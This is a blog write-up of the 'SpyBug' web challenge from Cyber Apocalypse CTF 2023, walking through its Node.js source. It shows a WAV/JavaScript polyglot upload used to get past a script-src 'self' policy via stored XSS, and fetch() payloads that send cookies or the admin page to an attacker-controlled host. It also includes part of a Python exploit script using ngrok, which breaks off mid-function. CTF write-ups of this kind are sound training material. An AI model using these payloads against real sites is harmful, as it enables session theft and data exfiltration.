@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title> Cyber Apocalypse CTF 2023 - SpyBug —   | Gabriele Pongelli</title>
+<meta name="description" content="This is the blog of Gabriele Pongelli.">
+<meta name="keywords" content="">
+<link rel="canonical" href="/posts/writeups/web/htbctf2023-spybug">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css" type="text/css" />
+<link rel="stylesheet" href="/assets/css/github.css" type="text/css" />
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha512-NhSC1YmyruXifcj/KFRWoC561YpHpc5Jtzgvbuzx5VozKpWvQ+4nXhPdFgmx8xqexRcpAglTj9sIBWINXa8x5w==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
+<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    </head>
+    <body>
+        <div class="wrapper">
+        <header class="header">
+    <div class="navigation">
+        <a href="/" class="logo">Gabriele Pongelli</a>
+        <ul class="menu">
+            
+            
+            <li class="menu__entry"><a href="/">Home</a></li>
+            
+            <li class="menu__entry"><a href="/posts">Posts</a></li>
+            
+            <li class="menu__entry"><a href="/projects">Projects</a></li>
+            
+            <li class="menu__entry"><a href="/about">About</a></li>
+            
+        </ul>
+    </div>
+    <ul class="social-links">
+    
+    <a href="mailto:pongelligabriele@gmail.com" class="social-links__entry" target="_blank">
+    <em class="fa fa-envelope-square"></em>
+    </a>
+    
+    
+    <a href="https://github.com/gabrielepongelli" class="social-links__entry" target="_blank">
+    <em class="fab fa-github"></em>
+    </a>
+    
+    
+    <a href="https://in.linkedin.com/in/gabriele-p-68027a166" class="social-links__entry" target="_blank">
+    <em class="fab fa-linkedin"></em>
+    </a>
+    
+    </ul>
+</header>
+        <h1 class="page-title">
+<div class="page-title__text">Cyber Apocalypse CTF 2023 - SpyBug</div>
+<div class="page-title__subtitle"></div>
+</h1>
+
+<div class="entry-content markdown-body">
+<p>
+    <strong class="post-meta">
+        <time class="dt-published" datetime="2023-03-21T00:00:00+00:00" itemprop="datePublished">Mar 21, 2023
+        </time></strong>
+</p>
+
+<p><strong>Category:</strong> Web<br />
+<strong>Difficulty</strong>: Medium<br />
+<strong>Description</strong>: As Pandora made her way through the ancient tombs, she received a message from her contact in the Intergalactic Ministry of Spies. They had intercepted a communication from a rival treasure hunter who was working for the alien species. The message contained information about a digital portal that leads to a software used for intercepting audio from the Ministry’s communication channels. Can you hack into the portal and take down the aliens counter-spying operation?<br />
+<strong>Address</strong>: 165.232.100.46:31763<br />
+<strong>Attachments</strong>: <a href="/assets/data/writeups/web/htbctf2023-spybug/web_spybug.zip">web_spybug.zip</a><br /></p>
+
+<p>If we visit the provided address we will see a login page that asks us for username and password, and nothing else is present:
+<img src="/assets/data/writeups/web/htbctf2023-spybug/imgs/login_page.png" alt="" />
+Since we have also the source code of the website, let’s take a look into it.</p>
+
+<p>From the Dockerfile we can see that the website is made using node and, from the <strong><code class="language-plaintext highlighter-rouge">web_spybug/build-docker.sh</code></strong> file we can see that the flag is stored in the <strong><code class="language-plaintext highlighter-rouge">FLAG</code></strong> environment variable. Also the session key and the admin password are stored inside environment variables, but they are not hardcoded, so we cannot know them. If we look at the code in the <strong><code class="language-plaintext highlighter-rouge">web_spybug/challenge/index.js</code></strong> file we can see 2 interesting things:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">....</span>
+<span class="p">....</span>
+<span class="nx">application</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Security-Policy</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';</span><span class="dl">"</span><span class="p">);</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cache-Control</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">no-cache, no-store, must-revalidate</span><span class="dl">"</span><span class="p">);</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Pragma</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">no-cache</span><span class="dl">"</span><span class="p">);</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Expires</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">);</span>
+  <span class="nx">next</span><span class="p">();</span>
+<span class="p">});</span>
+<span class="p">....</span>
+<span class="p">....</span>
+<span class="nx">setInterval</span><span class="p">(</span><span class="nx">visitPanel</span><span class="p">,</span> <span class="mi">60000</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>From the first slice of code we can see that the website use some specific HTTP headers, and in particular it uses the <strong><code class="language-plaintext highlighter-rouge">Content-Security-Policy</code></strong> header with the following values:</p>
+<ul>
+  <li><strong><code class="language-plaintext highlighter-rouge">script-src: 'self'</code></strong> specifies that only javascript scripts provided by the website itself are allowed.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">frame-ancestors: 'none'</code></strong> specifies that pages of this website cannot be embedded in other pages.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">object-src: 'none'</code></strong> specifies that no objects are allowed.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">base-uri: 'none'</code></strong> specifies that no URLs can be loaded using HTML elements.
+From the second slice we can see that every 60 seconds the function <strong><code class="language-plaintext highlighter-rouge">visitPanel</code></strong> will be called. If we look at its source code, located in the <strong><code class="language-plaintext highlighter-rouge">web_spybug/challenge/utils/adminbot.js</code></strong> file, we can see this:</li>
+</ul>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">exports</span><span class="p">.</span><span class="nx">visitPanel</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">(</span><span class="nx">browserOptions</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">createIncognitoBrowserContext</span><span class="p">();</span>
+    <span class="kd">let</span> <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
+
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://0.0.0.0:</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">API_PORT</span><span class="p">,</span> <span class="p">{</span>
+      <span class="na">waitUntil</span><span class="p">:</span> <span class="dl">"</span><span class="s2">networkidle2</span><span class="dl">"</span><span class="p">,</span>
+      <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">,</span>
+    <span class="p">});</span>
+
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">#username</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">);</span>
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">#password</span><span class="dl">"</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">ADMIN_SECRET</span><span class="p">);</span>
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="dl">"</span><span class="s2">#loginButton</span><span class="dl">"</span><span class="p">);</span>
+
+    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">waitForTimeout</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
+    <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>So, every 60 seconds, a login will be done by an automated browser using the credentials of the <strong><code class="language-plaintext highlighter-rouge">admin</code></strong> user. After that it waits on the new page for 5 seconds and finally the browser is closed. Since everything we know up to now has something to do with the login page, let’s see what it does. It’s source code is in the <strong><code class="language-plaintext highlighter-rouge">web_spybug/challenge/routes/panel.js</code></strong> file:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/panel/login</span><span class="dl">"</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
+  <span class="kd">let</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span><span class="p">))</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="k">await</span> <span class="nx">checkUserLogin</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)))</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/panel/login</span><span class="dl">"</span><span class="p">);</span>
+
+  <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">loggedin</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">username</span><span class="p">;</span>
+
+  <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/panel</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>It basically checks username and password using a function called <strong><code class="language-plaintext highlighter-rouge">checkUserLogin</code></strong>, which is stored in the <strong><code class="language-plaintext highlighter-rouge">web_spybug/challenge/utils/database.js</code></strong> file:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">exports</span><span class="p">.</span><span class="nx">checkUserLogin</span> <span class="o">=</span> <span class="k">async</span> <span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">results</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">User</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span>
+        <span class="na">where</span><span class="p">:</span> <span class="p">{</span>
+            <span class="na">username</span><span class="p">:</span> <span class="nx">username</span><span class="p">,</span>
+        <span class="p">},</span>
+    <span class="p">});</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">bcrypt</span><span class="p">.</span><span class="nx">compareSync</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span> <span class="nx">results</span><span class="p">.</span><span class="nx">password</span><span class="p">))</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>It perform a simple check, but I cannot see any flaw. If we go back to the login handling function we can see that, if the login is successful, some values are stored in the session (and in particular <strong><code class="language-plaintext highlighter-rouge">req.session.loggedin = true;</code></strong>) and the user is redirected to the <strong><code class="language-plaintext highlighter-rouge">/panel</code></strong> page. Let’s see what this page is:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/panel</span><span class="dl">"</span><span class="p">,</span> <span class="nx">authUser</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">panel</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
+    <span class="na">username</span><span class="p">:</span>
+      <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span>
+        <span class="p">?</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span>
+        <span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span>
+    <span class="na">agents</span><span class="p">:</span> <span class="k">await</span> <span class="nx">getAgents</span><span class="p">(),</span>
+    <span class="na">recordings</span><span class="p">:</span> <span class="k">await</span> <span class="nx">getRecordings</span><span class="p">(),</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>Interesting!! If we login as admin, then this page will directly shows us the flag! So our objective is to visit the <strong><code class="language-plaintext highlighter-rouge">/panel</code></strong> endpoint after logged in as <strong><code class="language-plaintext highlighter-rouge">admin</code></strong>. In this page there are also other things that are rendered, and are produced by 2 functions named <strong><code class="language-plaintext highlighter-rouge">getAgents</code></strong> and <strong><code class="language-plaintext highlighter-rouge">getRecordings</code></strong> so let’s see what they do:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">exports</span><span class="p">.</span><span class="nx">getAgents</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">results</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">Agent</span><span class="p">.</span><span class="nx">findAll</span><span class="p">();</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="nx">results</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="nx">exports</span><span class="p">.</span><span class="nx">getRecordings</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">results</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">Recording</span><span class="p">.</span><span class="nx">findAll</span><span class="p">();</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">results</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="nx">results</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>They only fetch all the recordings and all the agents and display them. The next thing I want to know now is: how agents and recordings are created? In the <strong><code class="language-plaintext highlighter-rouge">web_spybug/challenge/routes/agents.js</code></strong> file and in the <strong><code class="language-plaintext highlighter-rouge">web_spybug/challenge/utils/database.js</code></strong> file there are some functions and endpoints that have something to do with them. We can see that:</p>
+<ul>
+  <li>we can create new agents through a GET request to the <strong><code class="language-plaintext highlighter-rouge">/agents/register</code></strong> endpoint, and the credentials of the newly agent will be returned to us in json format.</li>
+  <li>we can update some details about an existing agent (called <strong><code class="language-plaintext highlighter-rouge">hostname</code></strong>, <strong><code class="language-plaintext highlighter-rouge">platform</code></strong>, and <strong><code class="language-plaintext highlighter-rouge">arch</code></strong>) through a POST request to the <strong><code class="language-plaintext highlighter-rouge">/agents/details/:identifier/:token</code></strong>, where we have to specify in the path the credentials of an existent agent. One thing that caught my attention is that those details that we provide aren’t sanitized in any way and are stored as they are.</li>
+  <li>we can upload new recordings, that will be associated to an existing agent, through a POST request to the <strong><code class="language-plaintext highlighter-rouge">/agents/upload/:identifier/:token</code></strong> endpoint and receive the new file name. Note that the newly uploaded file will be saved in the <strong><code class="language-plaintext highlighter-rouge">/uploads</code></strong> folder.
+And all this can be done without the need to be logged in.</li>
+</ul>
+
+<p>My first thought were: well, since the values of the details aren’ sanitized, and they are then displayed in the panel page, we can inject some inline javascript HTML tag in one of those so that it will be rendered and we can execute our own javascript code. And then, since the panel page is visited every 60 seconds by an automated browser, which before perform a login as <strong><code class="language-plaintext highlighter-rouge">admin</code></strong>, we can steal its session cookie and visit the panel page as admin without the need of knowing the credentials. It seemed easy… BUT I didn’t remember about the <strong><code class="language-plaintext highlighter-rouge">Content-Security-Policy</code></strong> header that we have seen earlier, and in particular the <strong><code class="language-plaintext highlighter-rouge">script-src: 'self'</code></strong> value. This means that we cannot execute inline javascript code, but only code that is stored into a file on the web server. I remembered this after a lot of trial and errors….</p>
+
+<p>Now, we can recall that we can upload new recordings by using the <strong><code class="language-plaintext highlighter-rouge">/agents/upload/:identifier/:token</code></strong> endpoint. Let’s take a closer look at what it does:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">....</span>
+<span class="p">....</span>
+<span class="kd">const</span> <span class="nx">storage</span> <span class="o">=</span> <span class="nx">multer</span><span class="p">.</span><span class="nx">diskStorage</span><span class="p">({</span>
+  <span class="na">filename</span><span class="p">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">uuidv4</span><span class="p">());</span>
+  <span class="p">},</span>
+  <span class="na">destination</span><span class="p">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="dl">"</span><span class="s2">./uploads</span><span class="dl">"</span><span class="p">);</span>
+  <span class="p">},</span>
+<span class="p">});</span>
+
+<span class="kd">const</span> <span class="nx">multerUpload</span> <span class="o">=</span> <span class="nx">multer</span><span class="p">({</span>
+  <span class="na">storage</span><span class="p">:</span> <span class="nx">storage</span><span class="p">,</span>
+  <span class="na">fileFilter</span><span class="p">:</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span>
+      <span class="nx">file</span><span class="p">.</span><span class="nx">mimetype</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">audio/wave</span><span class="dl">"</span> <span class="o">&amp;&amp;</span>
+      <span class="nx">path</span><span class="p">.</span><span class="nx">extname</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">originalname</span><span class="p">)</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">.wav</span><span class="dl">"</span>
+    <span class="p">)</span> <span class="p">{</span>
+      <span class="nx">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">cb</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">},</span>
+<span class="p">});</span>
+<span class="p">....</span>
+<span class="p">....</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span>
+  <span class="dl">"</span><span class="s2">/agents/upload/:identifier/:token</span><span class="dl">"</span><span class="p">,</span>
+  <span class="nx">authAgent</span><span class="p">,</span>
+  <span class="nx">multerUpload</span><span class="p">.</span><span class="nx">single</span><span class="p">(</span><span class="dl">"</span><span class="s2">recording</span><span class="dl">"</span><span class="p">),</span>
+  <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
+
+    <span class="kd">const</span> <span class="nx">filepath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">./uploads/</span><span class="dl">"</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">filename</span><span class="p">);</span>
+    <span class="kd">const</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">filepath</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">buffer</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/52494646</span><span class="se">[</span><span class="sr">a-z0-9</span><span class="se">]{8}</span><span class="sr">57415645/g</span><span class="p">))</span> <span class="p">{</span>
+      <span class="nx">fs</span><span class="p">.</span><span class="nx">unlinkSync</span><span class="p">(</span><span class="nx">filepath</span><span class="p">);</span>
+      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">await</span> <span class="nx">createRecording</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">identifier</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">filename</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">filename</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>We can see that it checks:</p>
+<ol>
+  <li>if the mime type is <strong><code class="language-plaintext highlighter-rouge">audio/wave</code></strong>.</li>
+  <li>if the extension of the original file uploaded was <strong><code class="language-plaintext highlighter-rouge">.wav</code></strong>.</li>
+  <li>if it contains the magic numbers that are contained into a wave file.
+So we can create our custom file, with the wave magic numbers and that contains javascript code. The end result is something like this:</li>
+</ol>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">RIFFaaaaWAVE</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://ADDRESS/?cookies=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookies</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>In this way, when the automated browser will visit the panel page, this script will be executed and, as a result will make a GET request to a server controlled by us appending in the query the name and the value of every cookie set, and also the session cookie. Ok, so I writed a script to do this, fired up a local server and launched that script… but nothing happened…</p>
+
+<p>After a while I saw that the cookies of this website were saved with the <strong><code class="language-plaintext highlighter-rouge">HttpOnly</code></strong> option enabled, and this means that we cannot access them through javascript code. After a while I realized that, since the page will be seen by someone that is already logged in with the admin credentials, it is already able to see the flag. So, instead of trying to get the flag by ourself, why don’t we get it sended by the one who can already see it. So in the javascript code we can perform a POST request, and append the flag in the body, but since I’m not that good at javascript and didn’t want to loose other time, I will send the entire page content… just to be sure.</p>
+
+<p>Ok, now to recap all what we have to do:</p>
+<ol>
+  <li>create a new agent with a GET request to <strong><code class="language-plaintext highlighter-rouge">/agents/register</code></strong> and retrieve the new credentials.</li>
+  <li>craft the custom wave file with javascript code inside that will reach back to us.</li>
+  <li>update that file with a POST request to <strong><code class="language-plaintext highlighter-rouge">/agents/upload/:identifier/:token</code></strong> and retrieve its name on the server.</li>
+  <li>Update the details of the agent we created before, and inject a HTML script tag that will refer to our uploaded wave file.</li>
+  <li>Fire up a server listening on our machine and wait for the automated browser to visit the <strong><code class="language-plaintext highlighter-rouge">/panel</code></strong> endpoint.</li>
+</ol>
+
+<p>In order to automate all this I created this python script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">from</span> <span class="nn">pyngrok</span> <span class="kn">import</span> <span class="n">ngrok</span>
+<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>
+
+<span class="n">ADDRESS</span> <span class="o">=</span> <span class="s">"165.232.100.46:31763"</span>
+<span class="n">LOCAL_SERVER_PORT</span> <span class="o">=</span> <span class="mi">8080</span>
+
+<span class="k">def</span> <span class="nf">steal_page</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">stealed_page</span> <span class="o">=</span> <span class="s">''</span>
+
+    <span class="k">class</span> <span class="nc">HTTPPageStealer</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+        <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+            <span class="k">nonlocal</span> <span class="n">stealed_page</span>
+            <span class="n">stealed_page</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Length'</span><span class="p">])).</span><span class="n">decode</span><span class="p">()</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
+            <span class="k">return</span>
+
+    <span class="n">http_server</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">((</span><span class="s">'localhost'</span><span class="p">,</span> <span class="n">LOCAL_SERVER_PORT</span><span class="p">),</span> <span class="n">HTTPPageStealer</span><span class="p">)</span>
+    <span class="n">http_server</span><span class="p">.</span><span class="n">handle_request</span><span class="p">()</span> <span class="c1"># only one request is handled
+</span> 
+    <span class="k">return</span> <span class="n">stealed_page</span>
+
+<span class="k">def</span> <span class="nf">get_js_script</span><span class="p">(</span><span class="n">public_url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="s">"""RIFFaaaaWAVE=0;
+fetch('</span><span class="si">{</span><span class="n">public_url</span><span class="si">}</span><span class="s">/', {{method: 'POST', body: document.documentElement.innerHTML }});
+"""</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># create new agent
+</span>    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ADDRESS</span><span class="si">}</span><span class="s">/agents/register"</span><span class="p">)</span>
